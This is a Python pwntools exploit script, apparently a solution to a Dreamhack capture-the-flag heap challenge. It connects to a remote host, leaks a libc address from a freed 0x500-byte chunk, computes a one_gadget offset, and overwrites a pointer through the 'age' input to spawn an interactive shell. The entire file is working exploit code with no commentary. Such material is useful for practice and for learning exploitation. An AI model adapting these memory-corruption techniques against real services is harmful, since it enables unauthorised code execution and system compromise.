from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 11862
r = remote(HOST, PORT)

def human(weight, age):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'Weight: ', str(weight).encode())
    r.sendlineafter(b'Age: ', str(age).encode())

def robot(weight):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'Weight: ', str(weight).encode())

def custom(size, data, idx):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'Size: ', str(size).encode())
    r.sendlineafter(b'Data: ', data)
    r.sendlineafter(b'Free idx: ', str(idx).encode())

custom(0x500, b'A', -1)
custom(0x500, b'B', 0)

r.sendline(f'3 {0x500} AAAAAAA'.encode())

r.recvuntil(b'AAAAAA\n')
libc = u64(r.recvline().strip().ljust(8, b'\x00'))-0x3ebca0
sh=libc+0x10a41c

r.sendlineafter(b'idx: ', b'-1')

robot(100)
human(100, sh)
robot(100)

r.interactive()